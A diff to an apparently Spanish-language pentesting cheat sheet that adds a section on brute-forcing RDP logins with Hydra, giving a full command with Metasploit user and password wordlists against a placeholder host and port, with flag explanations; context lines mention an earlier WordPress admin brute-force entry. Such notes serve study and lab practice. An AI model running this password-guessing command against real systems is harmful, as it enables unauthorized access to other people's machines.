@@ -97,3 +97,16 @@ Esto se usa en el panel del admin de WordPress.
 	# P = Ruta o archivo que contiene las passwd
 	# l = Un usuario en especifico
 ```
+
+## Hydra fuerza bruta RDP
+
+```python 
+# Brute force para encontrar usuarios y sus passwd en RDP
+❯ hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<IP> -s 3333           
+
+	# L = Ruta o archivo que contiene los usuarios
+	# P = Ruta o archivo que contiene las passwd
+	# s = Especificas el puerto, si no lo haces Hydra asumira que es el puerto 3389
+```
+
+
